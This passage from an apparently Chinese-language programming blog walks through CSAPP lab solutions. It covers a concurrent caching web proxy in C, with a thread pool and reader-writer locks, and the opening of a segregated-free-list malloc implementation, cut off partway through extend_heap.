implemented\n&quot;</span>, method);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 至此，已经完成了对客户端请求的解析，接下来要构造出对服务器的请求</span><br>  <span class="hljs-comment">// 首先解析我们的uri，得到host port path</span><br>  URI *req_uri = (URI *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(URI));<br>  <span class="hljs-built_in">parse_line</span>(req_uri, uri);<br>  <span class="hljs-comment">// 根据我们的信息，构造出真正的发往服务器的请求</span><br>  <span class="hljs-type">char</span> req_server[MAXLINE];<br>  <span class="hljs-built_in">build_req_server</span>(req_server, req_uri);<br>  <span class="hljs-comment">// 开始连接服务器</span><br>  <span class="hljs-type">int</span> server_fd = <span class="hljs-built_in">Open_clientfd</span>(req_uri-&gt;host, req_uri-&gt;port);<br>  <span class="hljs-keyword">if</span> (server_fd &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 连接成功，设置缓冲区，将request写入</span><br>  <span class="hljs-type">rio_t</span> server_rio;<br>  <span class="hljs-built_in">Rio_readinitb</span>(&amp;server_rio, server_fd);<br>  <span class="hljs-built_in">Rio_writen</span>(server_fd, req_server, <span class="hljs-built_in">strlen</span>(req_server));<br>  <span class="hljs-comment">// 等待服务器的返回，并写入客户端的fd中</span><br>  <span class="hljs-type">size_t</span> rec_bytes;<br>  <span class="hljs-keyword">while</span> ((rec_bytes = <span class="hljs-built_in">Rio_readlineb</span>(&amp;server_rio, buf, MAXLINE)) != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;proxy received %d bytes\n&quot;</span>, (<span class="hljs-type">int</span>)rec_bytes);<br>    <span class="hljs-built_in">Rio_writen</span>(fd, buf, rec_bytes);<br>  &#125;<br>  <span class="hljs-built_in">Close</span>(server_fd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br><br>  <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-comment">// 监听请求连接的端口</span><br>  <span class="hljs-type">int</span> listenfd = <span class="hljs-built_in">Open_listenfd</span>(argv[<span class="hljs-number">1</span>]);<br>  <span class="hljs-comment">// 与客户端进行连接</span><br>  <span class="hljs-type">int</span> connfd;<br>  <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>  <span class="hljs-type">socklen_t</span> clientlen;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_storage</span> clientaddr;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    clientlen = <span class="hljs-built_in">sizeof</span>(clientaddr);<br>    connfd = <span class="hljs-built_in">Accept</span>(listenfd, (SA *)(&amp;clientaddr), &amp;clientlen);<br>    <span class="hljs-built_in">Getnameinfo</span>((SA *)(&amp;clientaddr), clientlen, hostname, MAXLINE, port,<br>                MAXLINE, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from(%s,%s)\n&quot;</span>, hostname, port);<br>    <span class="hljs-built_in">doit</span>(connfd);<br>    <span class="hljs-built_in">Close</span>(connfd);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h1 id="第二部分：并发"><a href="#第二部分：并发" class="headerlink" title="第二部分：并发"></a>第二部分：并发</h1><h2 id="任务要求-1"><a href="#任务要求-1" class="headerlink" title="任务要求"></a>任务要求</h2><ol><li>实现并发即可，没有要求用什么样的方式</li></ol><h2 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h2><ol><li>采用生产者消费者的方式，和书上第<code>12.5.5</code>节的代码几乎完全一样</li><li>需要在main函数中加入一个<code>Signal(SIGPIPE, SIG_IGN);</code>以屏蔽<code>SIGPIPE信号</code>。我不太清楚不屏蔽会怎么样，可能是不屏蔽的话，客户端如果意外挂了，会导致代理服务器一起挂了<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUBFSIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NTHREADS 4</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>  <span class="hljs-type">int</span> *buf;<br>  <span class="hljs-type">int</span> n;<br>  <span class="hljs-type">int</span> front;<br>  <span class="hljs-type">int</span> rear;<br>  <span class="hljs-type">sem_t</span> mutex;<br>  <span class="hljs-type">sem_t</span> slots;<br>  <span class="hljs-type">sem_t</span> items;<br>&#125; <span class="hljs-type">sbuf_t</span>;<br><br><span class="hljs-type">sbuf_t</span> sbuf;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sbuf_init</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>  sp-&gt;buf = <span class="hljs-built_in">Calloc</span>(n, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>));<br>  sp-&gt;n = n;<br>  sp-&gt;front = sp-&gt;rear = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">Sem_init</span>(&amp;sp-&gt;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">Sem_init</span>(&amp;sp-&gt;slots, <span class="hljs-number">0</span>, n);<br>  <span class="hljs-built_in">Sem_init</span>(&amp;sp-&gt;items, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sbuf_deinit</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span> </span>&#123; <span class="hljs-built_in">Free</span>(sp-&gt;buf); &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sbuf_insert</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> item)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;slots);<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;mutex);<br>  sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item;<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;mutex);<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;items);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sbuf_remove</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;items);<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;mutex);<br>  <span class="hljs-type">int</span> item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)];<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;mutex);<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;slots);<br>  <span class="hljs-keyword">return</span> item;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span> </span>&#123;<br>  <span class="hljs-built_in">Pthread_detach</span>(<span class="hljs-built_in">Pthread_self</span>());<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> connfd = <span class="hljs-built_in">sbuf_remove</span>(&amp;sbuf);<br>    <span class="hljs-built_in">doit</span>(connfd);<br>    <span class="hljs-built_in">Close</span>(connfd);<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br><br>  <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-comment">// 监听请求连接的端口</span><br>  <span class="hljs-built_in">Signal</span>(SIGPIPE, SIG_IGN);<br>  <span class="hljs-type">int</span> listenfd = <span class="hljs-built_in">Open_listenfd</span>(argv[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">// 线程池</span><br>  <span class="hljs-built_in">sbuf_init</span>(&amp;sbuf, SUBFSIZE);<br>  <span class="hljs-type">pthread_t</span> pid;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NTHREADS; i++) &#123;<br>    <span class="hljs-built_in">Pthread_create</span>(&amp;pid, <span class="hljs-literal">NULL</span>, thread, <span class="hljs-literal">NULL</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// 与客户端进行连接</span><br>  <span class="hljs-type">int</span> connfd;<br>  <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>  <span class="hljs-type">socklen_t</span> clientlen;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_storage</span> clientaddr;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    clientlen = <span class="hljs-built_in">sizeof</span>(clientaddr);<br>    connfd = <span class="hljs-built_in">Accept</span>(listenfd, (SA *)(&amp;clientaddr), &amp;clientlen);<br>    <span class="hljs-built_in">sbuf_insert</span>(&amp;sbuf, connfd);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="第三部分：cache"><a href="#第三部分：cache" class="headerlink" title="第三部分：cache"></a>第三部分：cache</h1><h2 id="任务要求-2"><a href="#任务要求-2" class="headerlink" title="任务要求"></a>任务要求</h2><ol><li>这里说是cache，还不如说是一个大号的哈希表，以uri为键，以对应的资源为值。然后对这个哈希表的长度有点要求，大概10个表项。因为题目要求<code>#define MAX_CACHE_SIZE 1049000</code>，<code>#define MAX_OBJECT_SIZE 102400</code>，其中object的意思就是一行，差不多就是十倍的样子</li><li>如果某个uri对应的资源太大了， 那就不考虑加入cache</li><li>对这个cahce需要实现并发访问，即加上锁，这里加入读写锁</li></ol><h2 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h2><ol><li>结合cachelab中cache的结构，还需要额外加上data字段</li><li>如果要实现真正的LRU，在并发访问的基础上，还需要对timestamp也加锁，否则就要用原子类型的变量</li><li>这个实现结合代码来看，思路还是比较清晰的，不再赘述<br>我在这里犯了两个小错，结果导致debug了好久</li><li><code>cacheline</code>中的<code>tag</code>和<code>data</code>的长度是不一样的，我一开始把<code>data</code>长度弄成了<code>MAXLINE</code>，结果0分</li><li>在<code>doit</code>中我们用<code>uri</code>去读<code>cache</code>以及写<code>cache</code>，但是我们在<code>doit</code>的<code>parse_line</code>函数里，是修改了<code>uri</code>的，因此要给<code>uri</code>搞一个备份，否则在写cache的时候，就错了<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 8192</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>  <span class="hljs-type">int</span> is_valid;<br>  <span class="hljs-type">char</span> tag[MAXLINE];<br>  <span class="hljs-type">char</span> data[MAX_OBJECT_SIZE];<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> access_time;<br>  <span class="hljs-type">int</span> read_cnt;<br>  <span class="hljs-type">sem_t</span> read_lock;<br>  <span class="hljs-type">sem_t</span> write_lock;<br>&#125; cacheline;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_LINES 10</span><br>cacheline Cache[MAX_CACHE_LINES];<br><br><span class="hljs-type">sem_t</span> time_mutex;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> time_stamp = <span class="hljs-number">1</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_cache</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE_LINES; i++) &#123;<br>    Cache[i].is_valid = <span class="hljs-number">0</span>;<br>    Cache[i].access_time = <span class="hljs-number">0</span>;<br>    Cache[i].read_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">Sem_init</span>(&amp;Cache[i].read_lock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">Sem_init</span>(&amp;Cache[i].write_lock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">Sem_init</span>(&amp;time_mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">read_in</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;Cache[i].read_lock);<br>  <span class="hljs-keyword">if</span> (Cache[i].read_cnt == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">P</span>(&amp;Cache[i].write_lock);<br>  &#125;<br>  Cache[i].read_cnt++;<br>  <span class="hljs-built_in">V</span>(&amp;Cache[i].read_lock);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">read_out</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;Cache[i].read_lock);<br>  <span class="hljs-keyword">if</span> (Cache[i].read_cnt == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">V</span>(&amp;Cache[i].write_lock);<br>  &#125;<br>  Cache[i].read_cnt--;<br>  <span class="hljs-built_in">V</span>(&amp;Cache[i].read_lock);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">read_cache</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *uri)</span> </span>&#123;<br>  <span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE_LINES; i++) &#123;<br>    <span class="hljs-built_in">read_in</span>(i);<br>    <span class="hljs-keyword">if</span> (Cache[i].is_valid &amp;&amp; !<span class="hljs-built_in">strcmp</span>(uri, Cache[i].tag)) &#123;<br>      flag = <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">P</span>(&amp;time_mutex);<br>      Cache[i].access_time = time_stamp++;<br>      <span class="hljs-built_in">V</span>(&amp;time_mutex);<br>      <span class="hljs-built_in">Rio_writen</span>(fd, Cache[i].data, <span class="hljs-built_in">strlen</span>(Cache[i].data));<br>    &#125;<br>    <span class="hljs-built_in">read_out</span>(i);<br>    <span class="hljs-keyword">if</span> (flag) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write_cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *data)</span> </span>&#123;<br>  <span class="hljs-type">int</span> has_empty = <span class="hljs-number">-1</span>;<br>  <span class="hljs-type">int</span> lru_evict = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE_LINES; i++) &#123;<br>    <span class="hljs-built_in">read_in</span>(i);<br>    <span class="hljs-keyword">if</span> (Cache[i].is_valid == <span class="hljs-number">0</span>) &#123;<br>      has_empty = i;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (Cache[i].access_time &lt; Cache[lru_evict].access_time) &#123;<br>      lru_evict = i;<br>    &#125;<br>    <span class="hljs-built_in">read_out</span>(i);<br>    <span class="hljs-keyword">if</span> (has_empty != <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-type">int</span> write_index = (has_empty == <span class="hljs-number">-1</span>) ? lru_evict : has_empty;<br>  <span class="hljs-built_in">P</span>(&amp;Cache[write_index].write_lock);<br>  Cache[write_index].is_valid = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">P</span>(&amp;time_mutex);<br>  Cache[write_index].access_time = time_stamp++;<br>  <span class="hljs-built_in">V</span>(&amp;time_mutex);<br>  <span class="hljs-built_in">strcpy</span>(Cache[write_index].tag, uri);<br>  <span class="hljs-built_in">strcpy</span>(Cache[write_index].data, data);<br>  <span class="hljs-built_in">V</span>(&amp;Cache[write_index].write_lock);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab6</title>
    <link href="/2023/08/06/csapp-lab6/"/>
    <url>/2023/08/06/csapp-lab6/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224203033.png" alt="20231224203033"></p><p>前情提要</p><ol><li>一定要把书中关于隐式空闲链表的实现代码好好看一下， 这个lab的代码和那个非常像</li></ol><h1 id="实验文档"><a href="#实验文档" class="headerlink" title="实验文档"></a>实验文档</h1><ol><li>只需要修改<code>mm.c</code>文件</li><li><code>mdriver.c</code>可以用来衡量性能<ol><li><code>make</code></li><li><code>./mdriver -V</code></li></ol></li><li>需要完成的函数<ol><li><code>int mm_init(void)</code><ol><li>最开始的时候调用</li><li>失败时返回-1，成功时返回0</li></ol></li><li><code>void *mm_malloc(size_t size)</code><ol><li>返回堆上的一个地址</li><li>至少包含size字节</li><li>向8字节对齐</li></ol></li><li><code>void mm_free(void *ptr)</code><ol><li>这个地址是通过malloc或者realloc分配的</li><li>这个地址还没有被free</li></ol></li><li><code>void *mm_realloc(void *ptr, size_t size)</code><ol><li>如果ptr是null，则相当于调用malloc</li><li>如果size是0，相当于调用free</li><li>新的地址开始的内容需要和原来一样，但是大小由size决定</li></ol></li></ol></li><li>可以调用的函数<ol><li><code>void *mem sbrk(int incr)</code><ol><li>为堆开辟内存空间</li><li>返回新开辟的内存的起始地址</li></ol></li><li><code>void *mem heap lo(void)</code>：返回堆的起始位置</li><li><code>void *mem heap hi(void)</code>：返回堆的终止位置</li><li><code>size t mem heapsize(void)</code>返回堆的大小</li><li><code>size t mem pagesize(void)</code>返回内存页面的大小</li></ol></li><li>测试<ol><li>.&#x2F;mdriver -t traces&#x2F; -v</li></ol></li></ol><h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><ol><li>模型选择书中的第603页的显示空闲链表<ol><li>首部和尾部相同，记录$size | alloc$</li><li>首部后面紧跟着两个指针，分别是pre和next，这两个指针指向前后的空闲块。（其实我这里有个疑惑，按理说我们操作的地址都是64位的，怎么可以用一块表示一个地址，一块明明才32位）</li></ol></li><li>空闲链表的管理采用书中9.9.14节介绍的方法<ol><li>将空闲块按大小划分为16类，分别是大小为$1,2-3,4-7,8-15$等等，最后一块记录的是$2^{15}-无穷$。每一类都维护一个链表，链表从小到大地记录着当前存在且位于这一类大小范围内的空闲块的bp指针。</li><li>查找的方法类似于二分查找，找到大于等于当前块的类，然后从这个类开始找，如果找不到合适的块，就往下一类找。如果实在找不到，就要去扩展堆的大小了</li></ol></li></ol><h1 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h1><p><code>int mm_init(void)</code><br>这个函数是用来初始化我们的堆，</p><ol><li>初始化空闲块数组</li><li>初始化原始的堆<ol><li>申请4个块（16个字节），和书中的隐式链表一样</li><li>分别为这4个块设置size和alloc</li></ol></li><li>申请扩展堆<ol><li>（构建初始的空闲块）</li><li>这里使用一个函数实现，因为后续还会使用到扩展堆这个操作<br>具体实现如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-comment">// 初始化记录空闲块的数组</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; LIST_MAX_SIZE; i++) &#123;<br>    segregated_free_lists[i] = <span class="hljs-literal">NULL</span>;<br>  &#125;<br>  <span class="hljs-comment">// 先请求空间来初始化堆的结构</span><br>  <span class="hljs-type">void</span> *heap_listp;<br>  <span class="hljs-keyword">if</span> ((heap_listp = mem_sbrk(<span class="hljs-number">4</span> * WSIZE)) == (<span class="hljs-type">void</span> *)(<span class="hljs-number">-1</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  PUT(heap_listp, <span class="hljs-number">0</span>);<br>  PUT(heap_listp + (<span class="hljs-number">1</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));<br>  PUT(heap_listp + (<span class="hljs-number">2</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));<br>  PUT(heap_listp + (<span class="hljs-number">3</span> * WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>  <span class="hljs-comment">// 为堆申请一个chunksize的虚存空间</span><br>  <span class="hljs-keyword">if</span> (extend_heap(CHUNKSIZE) == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h1><p><code>static void *extend_heap(size_t size)</code><br>这个函数用来给堆扩展size大小的空间，要完成的功能如下所示</p><ol><li>首先调整size：<ol><li><code>#define ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</code></li><li>这个宏就是实现了将size往最近的8的倍数舍入</li></ol></li><li>使用<code>mem_sbrk</code>申请size大小的空闲块</li><li>设置新得到的空闲块的的首部和尾部，以及重新设置堆的尾部<ol><li>新申请的空闲块的前一个4字节的小块就是之前堆的尾部，即长度为0，分配为为1的那个哥们。现在直接修改这个哥们，使其成为新申请的块的首部。</li></ol></li><li>将这个空闲块给放到空闲链表中去</li><li>尝试合并这个空闲块，因为原来堆的后面可能就是空闲的内存块<br>具体实现如下所示：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// word_count必须是偶数</span><br>  size = ALIGN(size);<br>  <span class="hljs-comment">// 使用mem_sbrk去申请空间</span><br>  <span class="hljs-type">void</span> *bp;<br>  <span class="hljs-keyword">if</span> ((bp = mem_sbrk(size)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125;<br>  <span class="hljs-comment">// 将新申请的内存加到已有的堆上去</span><br>  <span class="hljs-comment">// 现在有个指针bp，它指向的新申请的内存的真正的起始位置</span><br>  <span class="hljs-comment">// 正常来说，这个bp的前一块就是之前堆的结尾块，是没用的，现在直接拿来做新申请的块的首部</span><br>  <span class="hljs-comment">// 然后又将新申请的块的最后一块变成堆的尾部</span><br>  PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>  PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>  